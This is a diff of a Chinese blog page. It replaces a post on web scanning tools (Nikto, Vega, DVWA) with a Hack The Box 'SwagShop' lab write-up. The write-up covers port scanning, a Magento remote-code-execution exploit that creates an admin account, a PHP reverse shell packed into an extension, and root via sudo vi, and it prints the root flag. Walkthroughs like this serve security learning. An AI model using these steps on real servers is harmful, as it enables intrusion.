@@ -3,28 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Web渗透 | 梦梦的小站</title>
+  <title>对SwagShop的测试 | 梦梦的小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="WebWEB攻击面  Network OS WEB Server App server Web Application Database Browser">
-<meta name="keywords" content="linux,工具">
+  <meta name="description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
+<meta name="keywords" content="安全测试,靶机实验">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web渗透">
-<meta property="og:url" content="http://www.lanbainan.cn/2019/01/18/2019-1-18/index.html">
+<meta property="og:title" content="对SwagShop的测试">
+<meta property="og:url" content="http://www.lanbainan.cn/2019/07/03/2019-07-03/index.html">
 <meta property="og:site_name" content="梦梦的小站">
-<meta property="og:description" content="WebWEB攻击面  Network OS WEB Server App server Web Application Database Browser">
+<meta property="og:description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c394c6f40412.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c396cfb2c4b9.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c397090292b3.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c397bde0d865.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c39ed35af533.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/12/5c39ecae53f30.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/18/5c41277867e90.png">
-<meta property="og:updated_time" content="2019-01-18T01:10:55.591Z">
+<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c14b74479798854.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png">
+<meta property="og:updated_time" content="2019-07-03T10:03:38.728Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web渗透">
-<meta name="twitter:description" content="WebWEB攻击面  Network OS WEB Server App server Web Application Database Browser">
-<meta name="twitter:image" content="https://i.loli.net/2019/01/12/5c394c6f40412.png">
+<meta name="twitter:title" content="对SwagShop的测试">
+<meta name="twitter:description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/03/5d1c14b74479798854.png">
   
   
     <link rel="icon" href="/img/830.jpg">
@@ -212,11 +208,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-2019-1-18" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-2019-07-03" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/01/18/2019-1-18/" class="article-date">
-      <time datetime="2019-01-17T16:00:00.000Z" itemprop="datePublished">2019-01-18</time>
+      <a href="/2019/07/03/2019-07-03/" class="article-date">
+      <time datetime="2019-07-03T01:18:00.000Z" itemprop="datePublished">2019-07-03</time>
 </a>
     </div>
   
@@ -229,7 +225,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Web渗透
+      对SwagShop的测试
     </h1>
   
 
@@ -245,7 +241,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机实验/">靶机实验</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -255,62 +251,18 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="WEB攻击面"><a href="#WEB攻击面" class="headerlink" title="WEB攻击面"></a>WEB攻击面</h3><blockquote>
-<ul>
-<li>Network</li>
-<li>OS</li>
-<li>WEB Server</li>
-<li>App server</li>
-<li>Web Application</li>
-<li>Database</li>
-<li>Browser</li>
-</ul>
-</blockquote>
-<a id="more"></a>
-<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p> <strong>明文</strong></p>
-<ul>
-<li>无内建的机密性安全机制</li>
-<li>嗅探或代理截断可查看全部明文信息</li>
-<li>https只能提高传输层安全</li>
-</ul>
-<p><strong>无状态</strong></p>
-<ul>
-<li>每一次客户端和服务器端的通信都是独立的过程</li>
-<li>WEB应用需要跟踪客户端会话(多步通信)</li>
-<li>不使用cookie的应用,客户端每次请求都要重新身份验证(不现实)</li>
-<li>Session用于在用户身份验证后跟踪用户行为轨迹<br>— 提高用户体验,但增加了攻击向量</li>
-</ul>
-<p><strong>Cycle</strong></p>
-<ul>
-<li>请求/响应</li>
-</ul>
-<p><strong>重要的header</strong></p>
-<ul>
-<li>Set-Cookie:服务器发给客户端的SessionID (被窃取的风险)</li>
-<li>Content-Length:响应body部分的字节长度（观察异常字节）</li>
-<li>Location:重定向用户到另一个页面,可识别身份认证后允许访问的页面 </li>
-<li>Cookie:客户端发回给服务器证明用户状态的信息(头:值成对出现)</li>
-<li>Referrer:发起新请求之前用户位于哪个页面,服务器基于此头的安全限制很容易被修改绕过</li>
-</ul>
-<h2 id="实验环境与工具"><a href="#实验环境与工具" class="headerlink" title="实验环境与工具"></a>实验环境与工具</h2><p><strong>环境：DVWA</strong></p>
-<h3 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h3><p>将目标网页复制到本地（减少对目标系统的交互）<br><img src="https://i.loli.net/2019/01/12/5c394c6f40412.png" alt="1.png"><br>进行本地分析</p>
-<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -list-plugins 所以攻击方法（大类）</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nikto -list-plugins</span><br><span class="line">Plugin: fileops</span><br><span class="line"> File Operations - Saves results to a text file.</span><br><span class="line"> Written by Sullo, Copyright (C) 2012 CIRT Inc.</span><br><span class="line"></span><br><span class="line">Plugin: favicon</span><br><span class="line"> Favicon - Checks the web server&apos;s favicon against known favicons.</span><br><span class="line"> Written by Sullo, Copyright (C) 2008 CIRT Inc.</span><br><span class="line"></span><br><span class="line">Plugin: mutiple_index</span><br><span class="line"> Multiple Index - Checks for multiple index files</span><br><span class="line">.........</span><br><span class="line">Defined plugin macros:</span><br><span class="line"> @@DEFAULT = &quot;@@ALL;-@@MUTATE;tests(report:500)&quot;</span><br><span class="line">  (expanded) = &quot;httpoptions;robots;put_del_test;apacheusers;apache_expect_xss;fileops;msgs;content_search;paths;report_csv;headers;drupal;report_html;clientaccesspolicy;report_text;outdated;siebel;mutiple_index;cgi;favicon;cookies;report_sqlg;ssl;ms10_070;shellshock;report_xml;sitefiles;parked;negotiate;report_nbe;tests(report:500);auth;embedded&quot;</span><br><span class="line"> @@NONE = &quot;&quot;</span><br><span class="line"> @@ALL = &quot;fileops;favicon;mutiple_index;ms10_070;negotiate;headers;report_html;apacheusers;report_nbe;paths;robots;httpoptions;embedded;clientaccesspolicy;auth;report_text;cgi;content_search;apache_expect_xss;report_csv;siebel;report_sqlg;subdomain;put_del_test;parked;drupal;msgs;shellshock;report_xml;outdated;tests;dictionary;ssl;cookies;sitefiles&quot;</span><br><span class="line"> @@MUTATE = &quot;dictionary;subdomain&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host baidu.com -port 443 -ssl https扫描</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/01/12/5c396cfb2c4b9.png" alt="2.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 192.168.67.0/24 -oG - | nikto -host - 使用nmap获取开启80的ip并交给nikto扫描</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/01/12/5c397090292b3.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.67.136 -useproxy http://localhost:4444  使用代理扫描</span><br></pre></td></tr></table></figure></p>
-<p>nikto不支持用户登录扫描，但支持cookie登录扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nikto.conf 修改配置文件</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/01/12/5c397bde0d865.png" alt="4.png"></p>
-<h3 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h3><ul>
-<li>图形化操作</li>
-<li>JAVA编写的开源Web扫描器</li>
-<li>扫描模式</li>
-<li>代理模式（代理截断）</li>
-<li>爬站、处理表单、注入测试</li>
-<li>支持SSL（https）</li>
-</ul>
-<p>注：主要关注代码上的漏洞，不太关注Web sever方面的漏洞和app sever。在SQl注入、跨站、目录遍历、文件引入上较好。<br><img src="https://i.loli.net/2019/01/12/5c39ed35af533.png" alt="6.png"><br><strong>在代理处应注意：</strong><br><img src="https://i.loli.net/2019/01/12/5c39ecae53f30.png" alt="5.png"><br>避免出现不必要的状况。<br>这里将不再累述可以参考<a href="https://blog.csdn.net/kevinhanser/article/details/79444646" target="_blank" rel="noopener">这里</a>和<a href="https://cloud.tencent.com/developer/article/1094505" target="_blank" rel="noopener">这里</a>，当然最好的是<a href="https://subgraph.com/vega/documentation/index.en.html" target="_blank" rel="noopener">官方文档</a></p>
-<h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系:<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/01/18/5c41277867e90.png" alt="61c9ca52f9bd8803.png"></p>
+        <h1 id="SwagShop"><a href="#SwagShop" class="headerlink" title="SwagShop"></a>SwagShop</h1><p>靶机：10.10.10.140<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/188" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/188</a><br><a id="more"></a></p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -p 0-65535 192.168.67.135 --rate 1000</span><br></pre></td></tr></table></figure>
+<p>开放<code>22</code>,<code>80</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p22,80 10.10.10.140</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|_  256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home page</span><br></pre></td></tr></table></figure></p>
+<p>80端口开放服务，百度可知<br>Magento是一套专业开源的电子商务系统<br><img src="https://i.loli.net/2019/07/03/5d1c14b74479798854.png" alt="1.png"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit Magento</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png" alt="2.png"><br>令人注意的是由一个远程代码执行,将一些注释和代码修改一下<br><img src="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python 37977.py</span><br><span class="line">WORKED</span><br><span class="line">Check http://10.10.10.140/admin with creds forme:forme</span><br></pre></td></tr></table></figure></p>
+<p>得到账户密码<code>forme:forme</code><br>后台登录<code>http://10.10.10.140/index.php/admin</code><br>安装<a href="https://github.com/lavalamp-/LavaMagentoBD" target="_blank" rel="noopener">扩展shell</a>,<code>System&gt;Magento Connect&gt;Magento Connect Manager</code>,将<code>app\code\community\Lavalamp\Connector\controllers\IndexController.php</code>内容替换为<code>/usr/share/webshells/php/php-reverse-shell.php</code>并修改IP和端口，重新打包为<code>.tgz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf bd.tgz app package.xml skin</span><br></pre></td></tr></table></figure></p>
+<p>安装扩展,打开页面<code>http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure>
+<p>发现无需密码登录root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo &quot;test&quot; &gt; test</span><br><span class="line">sudo /usr/bin/vi /var/www/html/test -c &apos;!sh&apos;</span><br><span class="line">cat /root/root.txt</span><br><span class="line">c2b087d66e14a652a3b86a130ac56721</span><br><span class="line"></span><br><span class="line">   ___ ___</span><br><span class="line"> /| |/|\| |\</span><br><span class="line">/_| 麓 |.` |_\           We are open! (Almost)</span><br><span class="line">  |   |.  |</span><br><span class="line">  |   |.  |         Join the beta HTB Swag Store!</span><br><span class="line">  |___|.__|       https://hackthebox.store/password</span><br><span class="line"></span><br><span class="line">                   PS: Use root flag as password!</span><br></pre></td></tr></table></figure></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在解包打包时，没有查看官方文档，浪费了一定时间，不会就查文档，切记!切记!</p>
+<h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>
 
       
       
@@ -320,13 +272,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/01/18/2019-1-18/">Web渗透</a></p>
+        <p><span>本文标题:</span><a href="/2019/07/03/2019-07-03/">对SwagShop的测试</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 EV 的个人博客">EV</a></p>
-        <p><span>发布时间:</span>2019年01月18日 - 00时00分</p>
-        <p><span>最后更新:</span>2019年01月18日 - 09时10分</p>
+        <p><span>发布时间:</span>2019年07月03日 - 09时18分</p>
+        <p><span>最后更新:</span>2019年07月03日 - 18时03分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/01/18/2019-1-18/" title="Web渗透">http://www.lanbainan.cn/2019/01/18/2019-1-18/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://www.lanbainan.cn/2019/01/18/2019-1-18/　　作者: EV" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/03/2019-07-03/" title="对SwagShop的测试">http://www.lanbainan.cn/2019/07/03/2019-07-03/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.lanbainan.cn/2019/07/03/2019-07-03/　　作者: EV" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -339,18 +291,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/01/21/2019-1-21/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          在cgi模式下的phpmyadmin
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/11/12/2018-11-12/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">提权</div>
+    <a href="/2019/06/21/2019-06-21/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">对HTB Netmon的测试</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -362,7 +305,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB攻击面"><span class="toc-number">1.1.</span> <span class="toc-text">WEB攻击面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP协议"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境与工具"><span class="toc-number">2.</span> <span class="toc-text">实验环境与工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Httrack"><span class="toc-number">2.1.</span> <span class="toc-text">Httrack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nikto"><span class="toc-number">2.2.</span> <span class="toc-text">Nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vega"><span class="toc-number">2.3.</span> <span class="toc-text">Vega</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#到此结束"><span class="toc-number">3.</span> <span class="toc-text">到此结束</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SwagShop"><span class="toc-number">1.</span> <span class="toc-text">SwagShop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">1.2.</span> <span class="toc-text">0x02</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后记"><span class="toc-number">2.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#到此结束"><span class="toc-number">3.</span> <span class="toc-text">到此结束</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -441,13 +384,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/01/21/2019-1-21/" title="上一篇: 在cgi模式下的phpmyadmin">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/11/12/2018-11-12/" title="下一篇: 提权">
+            <a href="/2019/06/21/2019-06-21/" title="下一篇: 对HTB Netmon的测试">
                 <i class="fa fa-angle-right"></i>
             </a>
         
